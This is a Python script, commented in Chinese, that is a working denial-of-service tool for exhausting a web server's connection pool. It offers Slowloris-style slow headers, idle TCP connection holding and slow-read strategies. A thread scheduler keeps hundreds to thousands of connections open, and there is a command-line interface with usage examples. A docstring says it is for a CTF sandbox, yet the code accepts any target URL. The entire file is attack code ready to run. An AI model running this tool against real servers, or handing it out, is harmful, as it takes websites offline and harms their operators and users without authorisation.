#!/usr/bin/env python3
"""
连接池耗尽攻击脚本
通过创建大量连接并长时间占用来耗尽目标服务器的连接池。

支持三种策略：
  1. slow-headers — Slowloris 风格：发送不完整的 HTTP 头部，定期追加保持连接
  2. connection-hold — 建立 TCP 连接后不发送任何数据，仅占用连接槽位
  3. slow-read — 发送完整请求后以极慢速度读取响应，占用连接

所有策略均用于 CTF 沙盒测试环境。
"""

import argparse
import socket
import ssl
import sys
import time
import threading
import random
from urllib.parse import urlparse


# ================== 攻击策略基类 ==================

class AttackStrategy:
    """攻击策略基类"""

    def __init__(self, target_host: str, target_port: int, use_ssl: bool,
                 timeout: int, verbose: bool):
        self.target_host = target_host
        self.target_port = target_port
        self.use_ssl = use_ssl
        self.timeout = timeout
        self.verbose = verbose

    def create_socket(self):
        """创建原始 socket 连接"""
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(self.timeout)
        sock.connect((self.target_host, self.target_port))
        if self.use_ssl:
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            sock = context.wrap_socket(sock, server_hostname=self.target_host)
        return sock

    def attack(self, conn_id: int, stop_event: threading.Event):
        """执行攻击逻辑，子类实现"""
        raise NotImplementedError

    def name(self) -> str:
        raise NotImplementedError


class SlowHeaders(AttackStrategy):
    """Slowloris 风格：发送不完整 HTTP header，定期追加字符保持连接"""

    def name(self):
        return "slow-headers"

    def attack(self, conn_id: int, stop_event: threading.Event):
        sock = None
        try:
            sock = self.create_socket()
            request_line = (
                f"GET /{random.randint(0, 99999)} HTTP/1.1\r\n"
                f"Host: {self.target_host}\r\n"
                f"User-Agent: Mozilla/5.0 (CTF-SlowHeaders/{conn_id})\r\n"
                f"Accept: text/html,application/xhtml+xml,*/*\r\n"
            )
            sock.send(request_line.encode())

            if self.verbose:
                print(f"[conn-{conn_id}] 已建立，发送初始头部...")

            headers_sent = 0
            while not stop_event.is_set():
                interval = random.uniform(3, 15)
                stop_event.wait(interval)
                if stop_event.is_set():
                    break
                header_line = (
                    f"X-Slow-Attack-{headers_sent}: "
                    f"{random.randint(0, 999999999)}\r\n"
                )
                try:
                    sock.send(header_line.encode())
                    headers_sent += 1
                    if self.verbose:
                        print(
                            f"[conn-{conn_id}] 发送 header #{headers_sent}"
                        )
                except (socket.timeout, ConnectionError, OSError):
                    break

        except Exception as e:
            if self.verbose:
                print(f"[conn-{conn_id}] 连接失败: {e}")
        finally:
            if sock:
                try:
                    sock.close()
                except Exception:
                    pass


class ConnectionHold(AttackStrategy):
    """TCP 连接后不发送数据，仅占用连接槽"""

    def name(self):
        return "connection-hold"

    def attack(self, conn_id: int, stop_event: threading.Event):
        sock = None
        try:
            sock = self.create_socket()
            if self.verbose:
                print(f"[conn-{conn_id}] TCP 连接建立，保持中...")
            while not stop_event.is_set():
                try:
                    sock.settimeout(5)
                    data = sock.recv(1)
                    if not data:
                        break
                except socket.timeout:
                    continue
                except Exception:
                    break

        except Exception as e:
            if self.verbose:
                print(f"[conn-{conn_id}] 连接失败: {e}")
        finally:
            if sock:
                try:
                    sock.close()
                except Exception:
                    pass


class SlowRead(AttackStrategy):
    """完整请求后以极慢速度读取响应，占用服务端连接"""

    def name(self):
        return "slow-read"

    def attack(self, conn_id: int, stop_event: threading.Event):
        sock = None
        try:
            sock = self.create_socket()
            path = f"/?cache_bust={conn_id}-{random.randint(0, 999999)}"
            request = (
                f"GET {path} HTTP/1.1\r\n"
                f"Host: {self.target_host}\r\n"
                f"User-Agent: Mozilla/5.0 (CTF-SlowRead/{conn_id})\r\n"
                f"Accept: */*\r\n"
                f"Connection: keep-alive\r\n"
                f"\r\n"
            )
            sock.send(request.encode())

            if self.verbose:
                print(f"[conn-{conn_id}] 请求已发送，缓慢读取响应...")

            while not stop_event.is_set():
                sock.settimeout(15)
                try:
                    data = sock.recv(1)
                    if not data:
                        break
                    interval = random.uniform(1, 5)
                    stop_event.wait(interval)
                except socket.timeout:
                    continue
                except Exception:
                    break

        except Exception as e:
            if self.verbose:
                print(f"[conn-{conn_id}] 连接失败: {e}")
        finally:
            if sock:
                try:
                    sock.close()
                except Exception:
                    pass


# ================== 策略注册表 ==================

STRATEGIES = {
    "slow-headers": SlowHeaders,
    "connection-hold": ConnectionHold,
    "slow-read": SlowRead,
}


# ================== 攻击调度器 ==================

class AttackScheduler:
    """管理连接池耗尽攻击的生命周期"""

    def __init__(self, target_host: str, target_port: int, use_ssl: bool,
                 max_connections: int, ramp_rate: int, duration: int,
                 timeout: int, strategy: str, verbose: bool):
        self.target_host = target_host
        self.target_port = target_port
        self.use_ssl = use_ssl
        self.max_connections = max_connections
        self.ramp_rate = ramp_rate
        self.duration = duration
        self.timeout = timeout
        self.verbose = verbose

        strategy_cls = STRATEGIES[strategy]
        self.strategy = strategy_cls(
            target_host, target_port, use_ssl, timeout, verbose,
        )

        self.stop_event = threading.Event()
        self.connections: list[threading.Thread] = []
        self.conn_counter = 0
        self.lock = threading.Lock()

    def _worker(self, conn_id: int):
        self.strategy.attack(conn_id, self.stop_event)

    def _replenish_loop(self):
        """持续补充连接，维持 max_connections"""
        while not self.stop_event.is_set():
            with self.lock:
                alive = sum(1 for t in self.connections if t.is_alive())
                need = self.max_connections - alive

            if need > 0:
                batch = min(need, max(1, self.ramp_rate))
                for _ in range(batch):
                    if self.stop_event.is_set():
                        break
                    cid = self.conn_counter
                    self.conn_counter += 1
                    t = threading.Thread(
                        target=self._worker, args=(cid,), daemon=True,
                    )
                    t.start()
                    self.connections.append(t)

            time.sleep(0.01)

            if self.verbose:
                with self.lock:
                    alive = sum(1 for t in self.connections if t.is_alive())
                print(f"[status] 活跃连接: {alive}/{self.max_connections}")

    def run(self):
        """启动攻击"""
        print("=" * 60)
        print("⚡ 连接池耗尽攻击")
        print("=" * 60)
        print(f"目标:           {self.target_host}:{self.target_port}")
        print(f"SSL:            {'是' if self.use_ssl else '否'}")
        print(f"策略:            {self.strategy.name()}")
        print(f"最大连接数:      {self.max_connections}")
        print(f"新建速率/秒:     {self.ramp_rate}")
        print(f"持续时间:        {'无限' if self.duration == 0 else f'{self.duration}s'}")
        print(f"连接超时:        {self.timeout}s")
        print("=" * 60)
        print("按 Ctrl+C 停止攻击")
        print()

        replenisher = threading.Thread(target=self._replenish_loop, daemon=True)
        replenisher.start()

        start_time = time.time()
        try:
            while not self.stop_event.is_set():
                if self.duration > 0 and (time.time() - start_time) >= self.duration:
                    print(f"\n持续时间 {self.duration}s 已达到，正在停止...")
                    self.stop_event.set()
                    break
                time.sleep(1)
        except KeyboardInterrupt:
            print("\n收到中断信号，正在停止所有连接...")
            self.stop_event.set()

        with self.lock:
            threads = list(self.connections)
        for t in threads:
            t.join(timeout=2)

        with self.lock:
            alive = sum(1 for t in self.connections if t.is_alive())
        print(f"攻击结束。残余连接: {alive}")


# ================== 参数解析 ==================

def parse_args():
    parser = argparse.ArgumentParser(
        description="连接池耗尽攻击 -- 通过大量慢连接占用服务器连接池",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
策略说明：
  slow-headers      发送不完整 HTTP 头部，定期追加 header 保持连接
  connection-hold   仅建立 TCP 连接不发送数据，占用连接槽
  slow-read         发送完整请求后以极慢速度读取响应

示例：
  # Slowloris 风格攻击，300 个连接
  python dos.py -t https://example.com -n 300 -s slow-headers

  # 纯 TCP 连接占用，500 连接，持续 60 秒
  python dos.py -t http://example.com:8000 -n 500 -s connection-hold -D 60

  # 慢读攻击，每秒创建 20 个连接
  python dos.py -t https://example.com -n 200 -s slow-read -r 20

  # 高并发慢速攻击，2000 连接
  python dos.py -t http://192.168.1.100:3000 -n 2000 -s slow-headers --timeout 30
        """,
    )

    parser.add_argument(
        "-t", "--target",
        dest="target",
        required=True,
        help="目标 URL，如 http://example.com 或 https://example.com:8443",
    )

    parser.add_argument(
        "-n", "--connections",
        dest="max_connections",
        type=int,
        default=200,
        help="最大并发连接数（默认: 200）",
    )

    parser.add_argument(
        "-s", "--strategy",
        dest="strategy",
        choices=list(STRATEGIES.keys()),
        default="slow-headers",
        help="攻击策略（默认: slow-headers）",
    )

    parser.add_argument(
        "-r", "--ramp-rate",
        dest="ramp_rate",
        type=int,
        default=10,
        help="每秒新建连接数（默认: 10）",
    )

    parser.add_argument(
        "-D", "--duration",
        dest="duration",
        type=int,
        default=0,
        help="攻击持续时间秒数（默认: 0 表示无限，Ctrl+C 停止）",
    )

    parser.add_argument(
        "--timeout",
        dest="timeout",
        type=int,
        default=10,
        help="socket 超时秒数（默认: 10）",
    )

    parser.add_argument(
        "-v", "--verbose",
        dest="verbose",
        action="store_true",
        help="详细输出模式",
    )

    parser.add_argument(
        "-q", "--quiet",
        dest="quiet",
        action="store_true",
        help="静默模式（仅输出摘要）",
    )

    return parser.parse_args()


def parse_target(raw: str):
    """解析目标 URL，返回 (host, port, use_ssl)"""
    if not raw.startswith("http"):
        raw = "http://" + raw
    parsed = urlparse(raw)
    host = parsed.hostname or "localhost"
    if parsed.port:
        port = parsed.port
    else:
        port = 443 if parsed.scheme == "https" else 80
    use_ssl = parsed.scheme == "https" or port == 443
    return host, port, use_ssl


# ================== 入口 ==================

def main():
    args = parse_args()

    target_host, target_port, use_ssl = parse_target(args.target)
    verbose = args.verbose

    if args.quiet:
        verbose = False

    scheduler = AttackScheduler(
        target_host=target_host,
        target_port=target_port,
        use_ssl=use_ssl,
        max_connections=args.max_connections,
        ramp_rate=args.ramp_rate,
        duration=args.duration,
        timeout=args.timeout,
        strategy=args.strategy,
        verbose=verbose,
    )

    try:
        scheduler.run()
    except KeyboardInterrupt:
        print("\n已停止")
        sys.exit(0)


if __name__ == "__main__":
    main()
